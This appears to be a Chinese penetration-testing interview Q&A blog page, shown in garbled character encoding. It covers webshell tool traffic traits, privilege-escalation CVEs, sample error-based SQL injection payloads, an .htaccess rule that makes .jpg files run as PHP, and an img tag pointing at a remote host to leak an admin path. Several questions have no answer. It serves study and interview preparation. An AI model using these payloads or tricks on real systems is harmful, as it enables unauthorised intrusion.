<h3 id="èšå‰‘-èœåˆ€-C-åˆ€-å†°èçš„ç›¸åŒä¸ä¸ç›¸åŒä¹‹å¤„"><a href="#èšå‰‘-èœåˆ€-C-åˆ€-å†°èçš„ç›¸åŒä¸ä¸ç›¸åŒä¹‹å¤„" class="headerlink" title="èšå‰‘/èœåˆ€/C åˆ€/å†°èçš„ç›¸åŒä¸ä¸ç›¸åŒä¹‹å¤„"></a>èšå‰‘/èœåˆ€/C åˆ€/å†°èçš„ç›¸åŒä¸ä¸ç›¸åŒä¹‹å¤„</h3><p>  &lt;1&gt;èœåˆ€<br>    åªä½¿ç”¨urlç¼–ç +base64ç¼–ç <br>    shell ç‰¹å¾å°±æ˜¯ä¼ è¾“å‚æ•°åä¸º z0ï¼Œè¿˜å­˜åœ¨int_set(â€œdisplay_errosâ€,â€0â€)å­—ç¬¦ä¸²ç‰¹å¾<br>  &lt;2&gt;èšå‰‘<br>    é»˜è®¤çš„èšå‰‘shellè¿æ¥æ—¶ä¼šè¯·æ±‚ä¸¤æ¬¡ï¼Œå…¶è¯·æ±‚ä½“ç»è¿‡urlç¼–ç <br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  å…³é—­æŠ¥é”™å’Œ magic_qoutes ç„¶åå»è·å–ä¸»æœºä¿¡æ¯<br>    ç¬¬äºŒæ¬¡è¯·æ±‚  åˆ—å‡ºä¸»æœºç›®å½•<br>  &lt;3&gt;å†°è2.0<br>    ä½¿ç”¨AESåŠ å¯†å‘é€3æ¬¡è¯·æ±‚<br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  æœåŠ¡ç«¯äº§ç”Ÿå¯†é’¥å†™å…¥sessionï¼Œ sessionå’Œå½“å‰ä¼šè¯ç»‘å®šï¼Œä¸åŒå®¢æˆ·ç«¯çš„å¯†é’¥ä¹Ÿä¸åŒ<br>    ç¬¬äºŒæ¬¡è¯·æ±‚  è·å– key<br>    ç¬¬ä¸‰æ¬¡è¯·æ±‚  ä½¿ç”¨ keyçš„AESåŠ å¯†è¿›è¡Œé€šä¿¡<br>  &lt;4&gt;å†°è3.0<br>    ä½¿ç”¨AESåŠ å¯†å‘èµ·2æ¬¡è¯·æ±‚<br>    ä¸2.0ç›¸æ¯” å°‘äº†åŠ¨æ€å¯†é’¥è·å–çš„è¯·æ±‚ï¼Œä¸å†ä½¿ç”¨éšæœºç”Ÿæˆçš„keyï¼Œæ”¹ä¸ºå–è¿æ¥å¯†ç madï¼‹saltçš„å‰16ä¸ºä½œä¸ºå¯†é’¥<br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  åˆ¤æ–­æ˜¯å¦å¯ä»¥å»ºç«‹è¿æ¥<br>    ç¬¬äºŒæ¬¡è¯·æ±‚  å‘é€phpinfoç­‰ä»£ç æ‰§è¡Œï¼Œè·å–ç½‘ç«™ä¿¡æ¯<br>  &lt;5&gt;å“¥æ–¯æ‹‰<br>    æ”¯æŒ n ç§åŠ å¯†<br>    é‡‡ç”¨äº†å’Œå†°è 3.0 ä¸€æ ·çš„å¯†é’¥äº¤æ¢æ–¹å¼ï¼Œå“¥æ–¯æ‹‰å»ºç«‹è¿æ¥æ—¶ä¼šå‘èµ·ä¸‰æ¬¡è¯·æ±‚<br>    ç¬¬ä¸€æ¬¡è¯·æ±‚  æ•°æ®è¶…çº§é•¿ï¼Œå»ºç«‹ session<br>    ç¬¬äºŒä¸‰æ¬¡è¯·æ±‚ç¡®è®¤è¿æ¥</p>
<h3 id="æ­£å‘-SHELL-å’Œåå‘-SHELL-çš„åŒºåˆ«"><a href="#æ­£å‘-SHELL-å’Œåå‘-SHELL-çš„åŒºåˆ«" class="headerlink" title="æ­£å‘ SHELL å’Œåå‘ SHELL çš„åŒºåˆ«"></a>æ­£å‘ SHELL å’Œåå‘ SHELL çš„åŒºåˆ«</h3><p>  æ”»å‡»æœº(kali) å—å®³è€…(win7)ä¸ºä¾‹<br>  æ­£å‘ kali ä¸»åŠ¨è¿win7<br>  åå‘ kali ç›‘å¬ç«¯å£ win7å‘èµ·è¯·æ±‚è¿æ¥è¯¥ç«¯å£</p>
<h3 id="Windows-å¸¸ç”¨çš„ææƒæ–¹æ³•"><a href="#Windows-å¸¸ç”¨çš„ææƒæ–¹æ³•" class="headerlink" title="Windows å¸¸ç”¨çš„ææƒæ–¹æ³•"></a>Windows å¸¸ç”¨çš„ææƒæ–¹æ³•</h3><p>  potato<br>  udf<br>  systeminfo ææƒè¾…åŠ©é¡µ<br>  ms15-051<br>  ms14-067<br>  ä»¤ç‰Œçªƒå–</p>
<h3 id="Linux-ææƒæœ‰å“ªäº›æ–¹æ³•"><a href="#Linux-ææƒæœ‰å“ªäº›æ–¹æ³•" class="headerlink" title="Linux ææƒæœ‰å“ªäº›æ–¹æ³•"></a>Linux ææƒæœ‰å“ªäº›æ–¹æ³•</h3><p>  suid<br>  sudo<br>  ç¬¬ä¸‰æ–¹æœåŠ¡<br>  å†…æ ¸</p>
<p>  Linux DirtyPipeæœ¬åœ°ææƒ CVE-2022-0847<br>  Linux Polkitæƒé™æå‡æ¼æ´ CVE-2021-4034<br>  Linux sudoæƒé™æå‡æ¼æ´ CVE-2021-3156<br>  Linux kernelæƒé™æå‡æ¼æ´ CVE-2021-3493</p>
<h3 id="PHP-ååºåˆ—åŒ–"><a href="#PHP-ååºåˆ—åŒ–" class="headerlink" title="PHP ååºåˆ—åŒ–"></a>PHP ååºåˆ—åŒ–</h3><h3 id="ä¸ºä½•ä¸€ä¸ª-MYSQL-æ•°æ®åº“çš„ç«™ï¼Œåªæœ‰ä¸€ä¸ª-80-ç«¯å£å¼€æ”¾ï¼Ÿ"><a href="#ä¸ºä½•ä¸€ä¸ª-MYSQL-æ•°æ®åº“çš„ç«™ï¼Œåªæœ‰ä¸€ä¸ª-80-ç«¯å£å¼€æ”¾ï¼Ÿ" class="headerlink" title="ä¸ºä½•ä¸€ä¸ª MYSQL æ•°æ®åº“çš„ç«™ï¼Œåªæœ‰ä¸€ä¸ª 80 ç«¯å£å¼€æ”¾ï¼Ÿ"></a>ä¸ºä½•ä¸€ä¸ª MYSQL æ•°æ®åº“çš„ç«™ï¼Œåªæœ‰ä¸€ä¸ª 80 ç«¯å£å¼€æ”¾ï¼Ÿ</h3><p>  æ›´æ”¹äº†ç«¯å£<br>  ç«™åº“åˆ†ç¦»<br>  3306ä¸å¯¹å¤–å¼€æ”¾</p>
<h3 id="ä¸€ä¸ªæˆç†Ÿå¹¶ä¸”ç›¸å¯¹å®‰å…¨çš„-CMSï¼Œæ¸—é€æ—¶æ‰«æç›®å½•çš„æ„ä¹‰ï¼Ÿ"><a href="#ä¸€ä¸ªæˆç†Ÿå¹¶ä¸”ç›¸å¯¹å®‰å…¨çš„-CMSï¼Œæ¸—é€æ—¶æ‰«æç›®å½•çš„æ„ä¹‰ï¼Ÿ" class="headerlink" title="ä¸€ä¸ªæˆç†Ÿå¹¶ä¸”ç›¸å¯¹å®‰å…¨çš„ CMSï¼Œæ¸—é€æ—¶æ‰«æç›®å½•çš„æ„ä¹‰ï¼Ÿ"></a>ä¸€ä¸ªæˆç†Ÿå¹¶ä¸”ç›¸å¯¹å®‰å…¨çš„ CMSï¼Œæ¸—é€æ—¶æ‰«æç›®å½•çš„æ„ä¹‰ï¼Ÿ</h3><h3 id="åœ¨æŸåå°æ–°é—»ç¼–è¾‘ç•Œé¢çœ‹åˆ°ç¼–è¾‘å™¨ï¼Œåº”è¯¥å…ˆåšä»€ä¹ˆï¼Ÿ"><a href="#åœ¨æŸåå°æ–°é—»ç¼–è¾‘ç•Œé¢çœ‹åˆ°ç¼–è¾‘å™¨ï¼Œåº”è¯¥å…ˆåšä»€ä¹ˆï¼Ÿ" class="headerlink" title="åœ¨æŸåå°æ–°é—»ç¼–è¾‘ç•Œé¢çœ‹åˆ°ç¼–è¾‘å™¨ï¼Œåº”è¯¥å…ˆåšä»€ä¹ˆï¼Ÿ"></a>åœ¨æŸåå°æ–°é—»ç¼–è¾‘ç•Œé¢çœ‹åˆ°ç¼–è¾‘å™¨ï¼Œåº”è¯¥å…ˆåšä»€ä¹ˆï¼Ÿ</h3><p>  æŸ¥çœ‹ç¼–è¾‘å™¨ç‰ˆæœ¬åç§° æ‰¾ä¹‹å‰çˆ†å‡ºçš„å¯¹åº”æ¼æ´</p>
<h3 id="å®¡æŸ¥ä¸Šä¼ ç‚¹çš„å…ƒç´ æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿ"><a href="#å®¡æŸ¥ä¸Šä¼ ç‚¹çš„å…ƒç´ æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿ" class="headerlink" title="å®¡æŸ¥ä¸Šä¼ ç‚¹çš„å…ƒç´ æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿ"></a>å®¡æŸ¥ä¸Šä¼ ç‚¹çš„å…ƒç´ æœ‰ä»€ä¹ˆæ„ä¹‰ï¼Ÿ</h3><p>  å¦‚æœç«™ç‚¹æ–‡ä»¶ä¸Šä¼ ç±»å‹é™åˆ¶æ˜¯åœ¨å‰ç«¯å®ç°çš„ï¼Œé‚£ä¹ˆå¢åŠ ä¸Šä¼ ç±»å‹å°±å¯ä»¥ç»•è¿‡</p>
<h3 id="CSRF-å’Œ-XSS-å’Œ-XXE-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠä¿®å¤æ–¹å¼ï¼Ÿ"><a href="#CSRF-å’Œ-XSS-å’Œ-XXE-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠä¿®å¤æ–¹å¼ï¼Ÿ" class="headerlink" title="CSRF å’Œ XSS å’Œ XXE æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠä¿®å¤æ–¹å¼ï¼Ÿ"></a>CSRF å’Œ XSS å’Œ XXE æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠä¿®å¤æ–¹å¼ï¼Ÿ</h3><p>  XSSæ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œç”¨æˆ·æäº¤çš„æ•°æ®ä¸­å¯ä»¥æ„é€ ä»£ç æ¥æ‰§è¡Œï¼Œä»è€Œå®ç°çªƒå–ç”¨æˆ·ä¿¡æ¯ç­‰æ”»å‡»ã€‚ä¿®å¤æ–¹å¼ï¼šå¯¹å­—ç¬¦å®ä½“è¿›è¡Œè½¬ä¹‰ã€ä½¿ç”¨HTTP Onlyæ¥ç¦æ­¢JavaScriptè¯»å–Cookieå€¼ã€è¾“å…¥æ—¶æ ¡éªŒã€è¾“å‡ºæ—¶é‡‡ç”¨htmlå®ä½“ç¼–ç ã€‚<br>  CSRFæ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼ŒXSSæ˜¯å®ç°CSRFçš„è¯¸å¤šæ‰‹æ®µä¸­çš„ä¸€ç§ï¼Œæ˜¯ç”±äºæ²¡æœ‰åœ¨å…³é”®æ“ä½œæ‰§è¡Œæ—¶è¿›è¡Œæ˜¯å¦ç”±ç”¨æˆ·è‡ªæ„¿å‘èµ·çš„ç¡®è®¤ã€‚ä¿®å¤æ–¹å¼ï¼šç­›é€‰å‡ºéœ€è¦é˜²èŒƒCSRFçš„é¡µé¢ç„¶ååµŒå…¥Tokenã€å†æ¬¡è¾“å…¥å¯†ç ã€æ£€éªŒReferer<br>  XXEæ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼ŒXMLä¸­å¯ä»¥é€šè¿‡è°ƒç”¨å®ä½“æ¥è¯·æ±‚æœ¬åœ°æˆ–è€…è¿œç¨‹å†…å®¹ï¼Œå’Œè¿œç¨‹æ–‡ä»¶ä¿æŠ¤ç±»ä¼¼ï¼Œä¼šå¼•å‘ç›¸å…³å®‰å…¨é—®é¢˜ï¼Œä¾‹å¦‚æ•æ„Ÿæ–‡ä»¶è¯»å–ã€‚ä¿®å¤æ–¹å¼ï¼šXMLè§£æåº“åœ¨è°ƒç”¨æ—¶ä¸¥æ ¼ç¦æ­¢å¯¹å¤–éƒ¨å®ä½“çš„è§£æã€‚</p>
<h3 id="3389-æ— æ³•è¿æ¥çš„å‡ ç§æƒ…å†µ"><a href="#3389-æ— æ³•è¿æ¥çš„å‡ ç§æƒ…å†µ" class="headerlink" title="3389 æ— æ³•è¿æ¥çš„å‡ ç§æƒ…å†µ"></a>3389 æ— æ³•è¿æ¥çš„å‡ ç§æƒ…å†µ</h3><p>  æ²¡å¼€æ”¾3389ç«¯å£<br>  ç«¯å£è¢«ä¿®æ”¹<br>  å¤„äºå†…ç½‘(éœ€è¦ç«¯å£è½¬å‘)<br>  é˜²æŠ¤æ‹¦æˆª</p>
<h3 id="ç›®æ ‡ç«™æ— é˜²æŠ¤ï¼Œä¸Šä¼ å›¾ç‰‡å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¸Šä¼ è„šæœ¬æ ¼å¼è®¿é—®åˆ™-403ï¼Œä»€ä¹ˆåŸå› ï¼Ÿ"><a href="#ç›®æ ‡ç«™æ— é˜²æŠ¤ï¼Œä¸Šä¼ å›¾ç‰‡å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¸Šä¼ è„šæœ¬æ ¼å¼è®¿é—®åˆ™-403ï¼Œä»€ä¹ˆåŸå› ï¼Ÿ" class="headerlink" title="ç›®æ ‡ç«™æ— é˜²æŠ¤ï¼Œä¸Šä¼ å›¾ç‰‡å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¸Šä¼ è„šæœ¬æ ¼å¼è®¿é—®åˆ™ 403ï¼Œä»€ä¹ˆåŸå› ï¼Ÿ"></a>ç›®æ ‡ç«™æ— é˜²æŠ¤ï¼Œä¸Šä¼ å›¾ç‰‡å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¸Šä¼ è„šæœ¬æ ¼å¼è®¿é—®åˆ™ 403ï¼Œä»€ä¹ˆåŸå› ï¼Ÿ</h3><h3 id="ç›®æ ‡ç«™ç¦æ­¢æ³¨å†Œç”¨æˆ·ï¼Œæ‰¾å›å¯†ç å¤„éšä¾¿è¾“å…¥ç”¨æˆ·åæç¤ºï¼šâ€œæ­¤ç”¨æˆ·ä¸å­˜åœ¨â€ï¼Œä½ è§‰å¾—è¿™é‡Œæ€æ ·åˆ©ç”¨ï¼Ÿ"><a href="#ç›®æ ‡ç«™ç¦æ­¢æ³¨å†Œç”¨æˆ·ï¼Œæ‰¾å›å¯†ç å¤„éšä¾¿è¾“å…¥ç”¨æˆ·åæç¤ºï¼šâ€œæ­¤ç”¨æˆ·ä¸å­˜åœ¨â€ï¼Œä½ è§‰å¾—è¿™é‡Œæ€æ ·åˆ©ç”¨ï¼Ÿ" class="headerlink" title="ç›®æ ‡ç«™ç¦æ­¢æ³¨å†Œç”¨æˆ·ï¼Œæ‰¾å›å¯†ç å¤„éšä¾¿è¾“å…¥ç”¨æˆ·åæç¤ºï¼šâ€œæ­¤ç”¨æˆ·ä¸å­˜åœ¨â€ï¼Œä½ è§‰å¾—è¿™é‡Œæ€æ ·åˆ©ç”¨ï¼Ÿ"></a>ç›®æ ‡ç«™ç¦æ­¢æ³¨å†Œç”¨æˆ·ï¼Œæ‰¾å›å¯†ç å¤„éšä¾¿è¾“å…¥ç”¨æˆ·åæç¤ºï¼šâ€œæ­¤ç”¨æˆ·ä¸å­˜åœ¨â€ï¼Œä½ è§‰å¾—è¿™é‡Œæ€æ ·åˆ©ç”¨ï¼Ÿ</h3><p>  å…ˆçˆ†ç ´ç”¨æˆ·å </p>
<h3 id="å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰ï¼Ÿ"><a href="#å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰ï¼Ÿ" class="headerlink" title="å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰ï¼Ÿ"></a>å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰ï¼Ÿ</h3><p>  å®½å­—èŠ‚æ³¨å…¥<br>  hexç¼–ç </p>
<h3 id="æ‹¿åˆ°ä¸€ä¸ª-webshell-å‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰-htaccess-æ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ"><a href="#æ‹¿åˆ°ä¸€ä¸ª-webshell-å‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰-htaccess-æ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ‹¿åˆ°ä¸€ä¸ª webshell å‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰.htaccess æ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ"></a>æ‹¿åˆ°ä¸€ä¸ª webshell å‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰.htaccess æ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ</h3><p>  <code>&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code><br>  .jpgæ–‡ä»¶ä¼šè¢«è§£ææˆ.phpæ–‡ä»¶</p>
<h3 id="å®‰å…¨ç‹—ä¼šè¿½è¸ªå˜é‡ï¼Œä»è€Œå‘ç°å‡ºæ˜¯ä¸€å¥è¯æœ¨é©¬å—ï¼Ÿ"><a href="#å®‰å…¨ç‹—ä¼šè¿½è¸ªå˜é‡ï¼Œä»è€Œå‘ç°å‡ºæ˜¯ä¸€å¥è¯æœ¨é©¬å—ï¼Ÿ" class="headerlink" title="å®‰å…¨ç‹—ä¼šè¿½è¸ªå˜é‡ï¼Œä»è€Œå‘ç°å‡ºæ˜¯ä¸€å¥è¯æœ¨é©¬å—ï¼Ÿ"></a>å®‰å…¨ç‹—ä¼šè¿½è¸ªå˜é‡ï¼Œä»è€Œå‘ç°å‡ºæ˜¯ä¸€å¥è¯æœ¨é©¬å—ï¼Ÿ</h3><h3 id="ææƒæ—¶é€‰æ‹©å¯è¯»å†™ç›®å½•ï¼Œä¸ºä½•å°½é‡ä¸ç”¨å¸¦ç©ºæ ¼çš„ç›®å½•ï¼Ÿ"><a href="#ææƒæ—¶é€‰æ‹©å¯è¯»å†™ç›®å½•ï¼Œä¸ºä½•å°½é‡ä¸ç”¨å¸¦ç©ºæ ¼çš„ç›®å½•ï¼Ÿ" class="headerlink" title="ææƒæ—¶é€‰æ‹©å¯è¯»å†™ç›®å½•ï¼Œä¸ºä½•å°½é‡ä¸ç”¨å¸¦ç©ºæ ¼çš„ç›®å½•ï¼Ÿ"></a>ææƒæ—¶é€‰æ‹©å¯è¯»å†™ç›®å½•ï¼Œä¸ºä½•å°½é‡ä¸ç”¨å¸¦ç©ºæ ¼çš„ç›®å½•ï¼Ÿ</h3><h3 id="å¦‚ä½•åˆ©ç”¨è¿™ä¸ªé˜²æ³¨å…¥ç³»ç»Ÿæ‹¿-shellï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨è¿™ä¸ªé˜²æ³¨å…¥ç³»ç»Ÿæ‹¿-shellï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨è¿™ä¸ªé˜²æ³¨å…¥ç³»ç»Ÿæ‹¿ shellï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨è¿™ä¸ªé˜²æ³¨å…¥ç³»ç»Ÿæ‹¿ shellï¼Ÿ</h3><h3 id="CSRFã€SSRF-å’Œé‡æ”¾æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#CSRFã€SSRF-å’Œé‡æ”¾æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="CSRFã€SSRF å’Œé‡æ”¾æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>CSRFã€SSRF å’Œé‡æ”¾æ”»å‡»æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3><p>  CSRFæ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»ï¼Œç”±å®¢æˆ·ç«¯å‘èµ· SSRFæ˜¯æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œç”±æœåŠ¡å™¨å‘èµ· é‡æ”¾æ”»å‡»æ˜¯å°†æˆªè·çš„æ•°æ®åŒ…è¿›è¡Œé‡æ”¾ï¼Œè¾¾åˆ°èº«ä»½è®¤è¯ç­‰ç›®çš„</p>
<h3 id="nmapæ‰«æçš„å‡ ç§æ–¹å¼"><a href="#nmapæ‰«æçš„å‡ ç§æ–¹å¼" class="headerlink" title="nmapæ‰«æçš„å‡ ç§æ–¹å¼"></a>nmapæ‰«æçš„å‡ ç§æ–¹å¼</h3><p>  sT  TCPæ‰«æ<br>  sU  UDPæ‰«æ<br>  sP  pingæ‰«æ<br>  Pn  ç¦pingæ‰«æ<br>  sS  åŠå¼€æ”¾æ‰«æ<br>  F   å¿«é€Ÿæ‰«æ</p>
<h3 id="æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿ"><a href="#æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿ"></a>æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿ</h3><p>  10ä¸ª<br>  <code>extractvalue(1, concat(0x7e,(select @@version),0x7e))</code><br>  <code>updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</code><br> <code>exp()select from test where id=1 and exp(~(select * from(select user())a));</code><br>  flooræŠ¥é”™å‘ä¸‹å–æ•´<br>  â€¦</p>
<h3 id="å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­ï¼Ÿ"><a href="#å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­ï¼Ÿ" class="headerlink" title="å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­ï¼Ÿ"></a>å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­ï¼Ÿ</h3><p>  sleep() benchmark()</p>
<h3 id="sql-æ³¨å…¥å†™æ–‡ä»¶éƒ½æœ‰å“ªäº›å‡½æ•°ï¼Ÿ"><a href="#sql-æ³¨å…¥å†™æ–‡ä»¶éƒ½æœ‰å“ªäº›å‡½æ•°ï¼Ÿ" class="headerlink" title="sql æ³¨å…¥å†™æ–‡ä»¶éƒ½æœ‰å“ªäº›å‡½æ•°ï¼Ÿ"></a>sql æ³¨å…¥å†™æ–‡ä»¶éƒ½æœ‰å“ªäº›å‡½æ•°ï¼Ÿ</h3><p>  into outfile<br>  into dumpfile</p>
<h3 id="phpä¸­å‘½ä»¤æ‰§è¡Œæ¶‰åŠåˆ°çš„å‡½æ•°"><a href="#phpä¸­å‘½ä»¤æ‰§è¡Œæ¶‰åŠåˆ°çš„å‡½æ•°" class="headerlink" title="phpä¸­å‘½ä»¤æ‰§è¡Œæ¶‰åŠåˆ°çš„å‡½æ•°"></a>phpä¸­å‘½ä»¤æ‰§è¡Œæ¶‰åŠåˆ°çš„å‡½æ•°</h3><p>  eval()ã€assert()ã€popen()ã€system()ã€exec()ã€shell_exec()ã€passthru()ã€pcntl_exec()ç­‰å‡½æ•°</p>
<h3 id="å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› "><a href="#å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› " class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› "></a>å®½å­—èŠ‚æ³¨å…¥äº§ç”ŸåŸç†ä»¥åŠæ ¹æœ¬åŸå› </h3><p>  åœ¨PHPä¸­æ¯”å¦‚addslashå’Œmagic_quotes_gpcå¼€å¯</p>
<h3 id="å¦‚ä½•é˜²æ­¢-CSRF"><a href="#å¦‚ä½•é˜²æ­¢-CSRF" class="headerlink" title="å¦‚ä½•é˜²æ­¢ CSRF?"></a>å¦‚ä½•é˜²æ­¢ CSRF?</h3><p>  éªŒè¯Referer<br>  æ·»åŠ token</p>
<h3 id="ä»£ç æ‰§è¡Œï¼Œæ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½æœ‰å“ªäº›ï¼Ÿ"><a href="#ä»£ç æ‰§è¡Œï¼Œæ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="ä»£ç æ‰§è¡Œï¼Œæ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½æœ‰å“ªäº›ï¼Ÿ"></a>ä»£ç æ‰§è¡Œï¼Œæ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½æœ‰å“ªäº›ï¼Ÿ</h3><p>  1ï¼Œä»£ç æ‰§è¡Œï¼š<br>  eval()ã€assert()ã€popen()ã€system()ã€exec()ã€shell_exec()ã€passthru(),pcntl_exec(),call_user_func_array(),create_function()<br>  2ï¼Œæ–‡ä»¶è¯»å–ï¼š<br>  file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()ç­‰<br>  3ï¼Œå‘½ä»¤æ‰§è¡Œï¼š<br>  system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<h3 id="img-æ ‡ç­¾é™¤äº†-onerror-å±æ€§å¤–ï¼Œè¿˜æœ‰å…¶ä»–è·å–ç®¡ç†å‘˜è·¯å¾„çš„åŠæ³•å—ï¼Ÿ"><a href="#img-æ ‡ç­¾é™¤äº†-onerror-å±æ€§å¤–ï¼Œè¿˜æœ‰å…¶ä»–è·å–ç®¡ç†å‘˜è·¯å¾„çš„åŠæ³•å—ï¼Ÿ" class="headerlink" title="img æ ‡ç­¾é™¤äº† onerror å±æ€§å¤–ï¼Œè¿˜æœ‰å…¶ä»–è·å–ç®¡ç†å‘˜è·¯å¾„çš„åŠæ³•å—ï¼Ÿ"></a>img æ ‡ç­¾é™¤äº† onerror å±æ€§å¤–ï¼Œè¿˜æœ‰å…¶ä»–è·å–ç®¡ç†å‘˜è·¯å¾„çš„åŠæ³•å—ï¼Ÿ</h3><p>  srcæŒ‡å®šä¸€ä¸ªè¿œç¨‹çš„è„šæœ¬æ–‡ä»¶ï¼Œè·å–referer</p>
<h3 id="img-æ ‡ç­¾é™¤äº†-onerror-å±æ€§å¤–ï¼Œå¹¶ä¸”-src-å±æ€§çš„åç¼€åï¼Œå¿…é¡»ä»¥-jpg-ç»“å°¾ï¼Œæ€ä¹ˆè·å–ç®¡ç†å‘˜è·¯å¾„ã€‚"><a href="#img-æ ‡ç­¾é™¤äº†-onerror-å±æ€§å¤–ï¼Œå¹¶ä¸”-src-å±æ€§çš„åç¼€åï¼Œå¿…é¡»ä»¥-jpg-ç»“å°¾ï¼Œæ€ä¹ˆè·å–ç®¡ç†å‘˜è·¯å¾„ã€‚" class="headerlink" title="img æ ‡ç­¾é™¤äº† onerror å±æ€§å¤–ï¼Œå¹¶ä¸” src å±æ€§çš„åç¼€åï¼Œå¿…é¡»ä»¥.jpg ç»“å°¾ï¼Œæ€ä¹ˆè·å–ç®¡ç†å‘˜è·¯å¾„ã€‚"></a>img æ ‡ç­¾é™¤äº† onerror å±æ€§å¤–ï¼Œå¹¶ä¸” src å±æ€§çš„åç¼€åï¼Œå¿…é¡»ä»¥.jpg ç»“å°¾ï¼Œæ€ä¹ˆè·å–ç®¡ç†å‘˜è·¯å¾„ã€‚</h3><p>  è¿œç¨‹æœåŠ¡å™¨ä¿®æ”¹apacheé…ç½®æ–‡ä»¶<br>  é…ç½®.jpgæ–‡ä»¶ä»¥phpæ–¹å¼æ¥è§£æ<code>AddType application/x-httpd-php .jpg</code><br>  <code>&lt;img src=http://xss.tv/1.jpg&gt;</code> ä¼šä»¥phpæ–¹å¼æ¥è§£æ</p>
<h3 id="ä¸ºä»€ä¹ˆ-aspx-æœ¨é©¬æƒé™æ¯”-asp-å¤§ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆ-aspx-æœ¨é©¬æƒé™æ¯”-asp-å¤§ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆ aspx æœ¨é©¬æƒé™æ¯” asp å¤§ï¼Ÿ"></a>ä¸ºä»€ä¹ˆ aspx æœ¨é©¬æƒé™æ¯” asp å¤§ï¼Ÿ</h3><p>  aspxä½¿ç”¨çš„æ˜¯.netæŠ€æœ¯ã€‚ IIS ä¸­é»˜è®¤ä¸æ”¯æŒï¼ŒASPåªæ˜¯è„šæœ¬è¯­è¨€è€Œå·²ã€‚<br>  å…¥ä¾µçš„æ—¶å€™aspçš„æœ¨é©¬ä¸€èˆ¬æ˜¯guestæƒé™â€¦APSXçš„æœ¨é©¬ä¸€èˆ¬æ˜¯usersæƒé™ã€‚</p>
